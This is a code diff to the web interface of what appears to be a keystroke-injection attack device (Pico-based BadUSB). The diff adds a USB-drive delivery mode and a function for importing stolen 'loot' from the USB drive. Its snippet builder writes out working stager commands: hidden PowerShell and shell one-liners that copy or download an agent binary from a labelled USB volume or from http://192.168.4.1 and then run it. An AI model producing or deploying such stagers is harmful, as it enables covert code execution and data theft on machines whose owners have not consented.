@@ -5,6 +5,9 @@ const runButton = document.getElementById('run');
 const refreshButton = document.getElementById('refresh');
 const keyboardOsSelect = document.getElementById('keyboard-os');
 const keyboardLayoutSelect = document.getElementById('keyboard-layout');
+const deliveryModeSelect = document.getElementById('delivery-mode');
+const usbAgentState = document.getElementById('usb-agent-state');
+const usbAgentToggle = document.getElementById('usb-agent-toggle');
 const runHistory = document.getElementById('run-history');
 const editorGutter = document.getElementById('editor-gutter');
 const editorHighlight = document.getElementById('editor-highlight');
@@ -26,6 +29,9 @@ const uiState = {
   changingTarget: false,
   keyboardOses: [],
   keyboardLayouts: [],
+  hasBinary: false,
+  usbAgent: null,
+  changingUsbAgent: false,
   running: false,
   saving: false,
   validating: false,
@@ -239,6 +245,22 @@ function updateControls() {
   if (keyboardOsSelect) keyboardOsSelect.disabled = uiState.changingTarget;
   if (keyboardLayoutSelect)
     keyboardLayoutSelect.disabled = uiState.changingTarget;
+  if (usbAgentToggle) {
+    const agent = uiState.usbAgent || {};
+    usbAgentToggle.disabled =
+      uiState.changingUsbAgent ||
+      !agent.available ||
+      (!agent.mounted && !agent.can_mount);
+  }
+  const injectBtn = document.getElementById('inject-binary-btn');
+  if (injectBtn) {
+    const delivery = deliveryModeSelect?.value || 'network';
+    const mounted = (uiState.usbAgent || {}).mounted;
+    injectBtn.disabled =
+      uiState.running ||
+      !uiState.hasBinary ||
+      (delivery === 'usb_drive' && !mounted);
+  }
 }
 
 function itemTitle(item) {
@@ -358,6 +380,27 @@ function renderKeyboardLayouts(state) {
 
   keyboardLayoutSelect.replaceChildren(...options);
   keyboardLayoutSelect.value = selected;
+}
+
+function renderUsbAgent(state) {
+  const agent = state?.usb_agent || state || {};
+  uiState.usbAgent = agent;
+  if (usbAgentState) {
+    const label = agent.message || agent.state || 'Inactive';
+    usbAgentState.textContent = label;
+  }
+  if (usbAgentToggle) {
+    usbAgentToggle.textContent = agent.mounted ? 'Unmount' : 'Mount';
+  }
+  updateControls();
+}
+
+function preferAvailableDelivery() {
+  if (!deliveryModeSelect) {
+    return;
+  }
+  const agent = uiState.usbAgent || {};
+  deliveryModeSelect.value = agent.available ? 'usb_drive' : 'network';
 }
 
 function measureEditor() {
@@ -631,6 +674,9 @@ async function loadBootstrap() {
   setBoundText('ap_ssid', state.ap_ssid);
   setBoundText('ap_password', state.ap_password || 'Open network');
   renderKeyboardLayouts(state);
+  renderUsbAgent(state);
+  preferAvailableDelivery();
+  uiState.hasBinary = Boolean(state.has_binary);
   renderRunHistory(state.run_history || []);
   setBoundText('seeded', state.seeded ? 'Yes' : 'No');
   setBoundText('hid_state', state.keyboard_ready ? 'Ready' : 'Waiting');
@@ -648,6 +694,7 @@ async function loadBootstrap() {
   }
   setNotice(state.message || '', state.notice || 'quiet');
   if (state.has_binary) setArmoryBinaryReady(_TMP_BINARY_NAME);
+  else updateControls();
   startLootStream();
 }
 
@@ -869,7 +916,11 @@ function renderLootEmpty() {
     el.appendChild(p);
   }
   const actions = document.getElementById('loot-actions');
-  if (actions) actions.hidden = true;
+  if (actions) actions.hidden = false;
+  const download = document.getElementById('loot-download');
+  if (download) download.hidden = true;
+  const importer = document.getElementById('loot-import-usb');
+  if (importer) importer.hidden = false;
 }
 
 function renderLoot(data) {
@@ -981,12 +1032,36 @@ function renderLoot(data) {
     actions.hidden = false;
     const btn = document.getElementById('loot-download');
     if (btn) {
+      btn.hidden = false;
       btn.onclick = () => {
         window.location.href = '/api/loot/download';
       };
     }
+    const importer = document.getElementById('loot-import-usb');
+    if (importer) importer.hidden = false;
   }
 }
+
+async function importUsbLoot() {
+  const btn = document.getElementById('loot-import-usb');
+  if (btn) btn.disabled = true;
+  try {
+    const result = await requestJson('/api/loot/import-usb', {
+      method: 'POST',
+      body: '{}',
+    });
+    if (result.loot) renderLoot(result.loot);
+    setNotice(result.message || 'USB loot imported.', result.notice || 'success');
+  } catch (error) {
+    setNotice(error.message || 'USB loot import failed.', 'error');
+  } finally {
+    if (btn) btn.disabled = false;
+  }
+}
+
+document
+  .getElementById('loot-import-usb')
+  ?.addEventListener('click', importUsbLoot);
 
 // ─── Loot live updates (SSE) ─────────────────────────────────────────────
 
@@ -1028,6 +1103,9 @@ function startLootStream() {
 // ─── Accordion ────────────────────────────────────────────────────────────
 
 const _TMP_BINARY_NAME = 'payload.bin';
+const _USB_VOLUME_LABEL = 'PICOBIT';
+const _USB_WINDOWS_AGENT = 'pico-agent';
+const _USB_UNIX_AGENT = 'pico-agent';
 const _ALLOWED_BINARY_EXTENSIONS = new Set(['appimage', 'bin', 'elf', 'exe']);
 const _BLOCKED_FILE_TYPES = new Set([
   'application/gzip',
@@ -1218,11 +1296,42 @@ document
   .getElementById('inject-os')
   ?.addEventListener('change', _updateArmorySnippet);
 
+deliveryModeSelect?.addEventListener('change', _updateArmorySnippet);
+deliveryModeSelect?.addEventListener('change', updateControls);
+
+usbAgentToggle?.addEventListener('click', async () => {
+  const mounted = !(uiState.usbAgent || {}).mounted;
+  uiState.changingUsbAgent = true;
+  updateControls();
+  _setArmoryNotice(mounted ? 'Mounting USB agent drive…' : 'Unmounting USB agent drive…', 'quiet');
+  try {
+    const result = await requestJson('/api/usb-agent', {
+      method: 'POST',
+      body: JSON.stringify({ mounted }),
+    });
+    renderUsbAgent(result);
+    _setArmoryNotice(result.message || 'USB agent drive updated.', result.notice || 'success');
+  } catch (err) {
+    if (err.data) renderUsbAgent(err.data);
+    _setArmoryNotice(err.message || 'USB agent drive update failed.', 'error');
+  } finally {
+    uiState.changingUsbAgent = false;
+    updateControls();
+  }
+});
+
 function _updateArmorySnippet() {
   const os = document.getElementById('inject-os')?.value || 'windows';
+  const delivery = deliveryModeSelect?.value || 'network';
   const url = 'http://192.168.4.1/static/payload.bin';
   let cmd = '';
-  if (os === 'windows') {
+  if (delivery === 'usb_drive' && os === 'windows') {
+    cmd = `powershell -w hidden -c "$v=Get-Volume -FileSystemLabel ${_USB_VOLUME_LABEL} -ErrorAction SilentlyContinue; if($v){$s=$v.DriveLetter + ':/${_USB_WINDOWS_AGENT}'; $d=Join-Path $env:TEMP 'pico_agent.exe'; Copy-Item $s $d -Force; & $d}"`;
+  } else if (delivery === 'usb_drive' && os === 'macos') {
+    cmd = `cp /Volumes/${_USB_VOLUME_LABEL}/${_USB_UNIX_AGENT} /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
+  } else if (delivery === 'usb_drive') {
+    cmd = `for d in /media/$USER/${_USB_VOLUME_LABEL} /run/media/$USER/${_USB_VOLUME_LABEL}; do [ -f "$d/${_USB_UNIX_AGENT}" ] && cp "$d/${_USB_UNIX_AGENT}" /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent & break; done`;
+  } else if (os === 'windows') {
     cmd = `powershell -w hidden -c "iwr ${url} -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"`;
   } else if (os === 'macos') {
     cmd = `curl -s ${url} -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
@@ -1236,13 +1345,13 @@ function _updateArmorySnippet() {
 }
 
 function setArmoryBinaryReady(name) {
+  uiState.hasBinary = true;
   const badge = document.getElementById('armory-badge');
   if (badge) {
     badge.textContent = name;
     badge.hidden = false;
   }
-  const btn = document.getElementById('inject-binary-btn');
-  if (btn) btn.disabled = false;
+  updateControls();
 }
 
 function _setArmoryNotice(message, type) {
@@ -1313,24 +1422,27 @@ document
   .getElementById('inject-binary-btn')
   ?.addEventListener('click', async () => {
     const os = document.getElementById('inject-os')?.value || 'windows';
+    const delivery = deliveryModeSelect?.value || 'network';
     const btn = document.getElementById('inject-binary-btn');
     if (btn) btn.disabled = true;
     _setArmoryNotice('Injecting stager…', 'quiet');
     try {
       const result = await requestJson('/api/inject_binary', {
         method: 'POST',
-        body: JSON.stringify({ os }),
+        body: JSON.stringify({ os, delivery }),
       });
       _setArmoryNotice(
         result.message || 'Injected.',
         result.notice || 'success',
       );
       setBoundText('hid_state', 'Ready');
+      if (result.usb_agent) renderUsbAgent(result);
       if (result.run_history) renderRunHistory(result.run_history);
     } catch (err) {
+      if (err.data?.usb_agent) renderUsbAgent(err.data);
       _setArmoryNotice(err.message || 'Injection failed.', 'error');
       if (err.data?.run_history) renderRunHistory(err.data.run_history);
     } finally {
-      if (btn) btn.disabled = false;
+      updateControls();
     }
   });
